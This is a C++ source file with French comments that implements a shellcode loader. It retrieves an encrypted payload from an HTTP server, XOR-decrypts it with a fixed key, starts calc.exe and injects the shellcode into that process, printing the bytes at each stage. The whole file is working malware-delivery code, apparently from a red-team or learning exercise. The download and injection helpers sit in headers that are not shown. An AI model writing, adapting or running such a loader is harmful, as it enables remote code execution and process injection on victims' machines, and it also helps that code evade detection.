#include <iostream> 
#include <tchar.h>

#include "Decrypt.h" 
#include "HTTPClient.h" 
#include "Memory.h" 


int main() {
    // Etape 2 : Récupération du shellcode chiffré du serveur HTTP 
    DWORD payloadSize = 0;
    PBYTE payload = getHTTPPayload(payloadSize);

    if (!payload) {
        std::cerr << "Échec de la récupération du shellcode." << std::endl;
        return 1;
    }

    std::cout << "Shellcode chiffré :" << std::endl;

    for (DWORD i = 0; i < payloadSize; i++) {
        printf("%02X ", payload[i]);
    }

    std::cout << std::endl;   

    // Fin de la récupération du shellcode chiffré du serveur http
    

    // Etape 3 : Déchiffrement du shellcode 
     // Clé de déchiffrement 
    unsigned char decryptionKey = 0xAA;

    // Déchiffrement du shellcode 

    decrypt(payload, payloadSize, decryptionKey);

    std::cout << "Shellcode déchiffré :" << std::endl;

    for (DWORD i = 0; i < payloadSize; i++) {
        printf("%02X ", payload[i]);
    }

    std::cout << std::endl;

    // Fin du déchiffrement du shellcode 

     // Etape 4 : Injection du shellcode
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    const TCHAR* target = _T("c:\\WINDOWS\\system32\\calc.exe");

    if (!CreateProcess(
        target,
        NULL,
        NULL,            // Sécurité pour le processus
        NULL,
        FALSE,           // Ne pas hériter des handles
        0,               // Aucune option particulière
        NULL,            // Variables d'environnement (ici, aucune)
        NULL,            // Dossier de travail actuel (ici, aucun)
        &si,             // Structure STARTUPINFO
        &pi              // Structure PROCESS_INFORMATION
    )) {
        printf("CreateProcess failed : erreur %d \n ", GetLastError());
        return 1;
    }
    DWORD targetPid = pi.dwProcessId;
    if (!injectShellcode(payload, payloadSize, targetPid)) {
        std::cout << "Échec de l'injection dans le processus." << std::endl;
        return 1;
    }
    else {
        std::cout << "Injection réussie !" << std::endl;
    }

    // Fin de l'injection du shellcode

    LocalFree(payload);
    return 0;
}